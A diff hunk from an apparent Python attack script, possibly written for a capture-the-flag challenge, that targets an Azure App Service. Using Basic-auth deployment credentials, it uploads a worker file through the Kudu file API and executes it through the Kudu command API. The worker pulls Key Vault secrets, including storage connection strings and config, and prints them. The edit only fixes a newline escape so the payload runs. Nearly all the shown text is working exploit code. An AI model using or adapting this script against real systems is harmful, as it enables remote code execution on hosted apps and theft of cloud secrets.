@@ -44,7 +44,7 @@ worker_lines=[
 "for n in ['flag','tbl-flag','config-storage-connection','storage-connection','internal-config']:",
 " s,b=g('https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/'+n+'?api-version=7.4',{'Authorization':'Bearer '+t}); print('SECRET',n,s,b)",
 ]
-worker='\\n'.join(worker_lines)
+worker='\n'.join(worker_lines)
 a=base64.b64encode((ku+':'+kp).encode()).decode(); u=f'https://{APP}.scm.azurewebsites.net/api/vfs/site/wwwroot/readflag.py'; s,b=rq(u,'PUT',worker.encode(),{'Authorization':'Basic '+a,'If-Match':'*'},40); print('vfs',s,b[:200],flush=True)
 cmd=json.dumps({'command':'python3 /home/site/wwwroot/readflag.py','dir':'site/wwwroot'}).encode(); s,b=rq(f'https://{APP}.scm.azurewebsites.net/api/command','POST',cmd,{'Authorization':'Basic '+a,'Content-Type':'application/json'},60); print('command',s,b.decode(errors='replace'),flush=True)
 PY
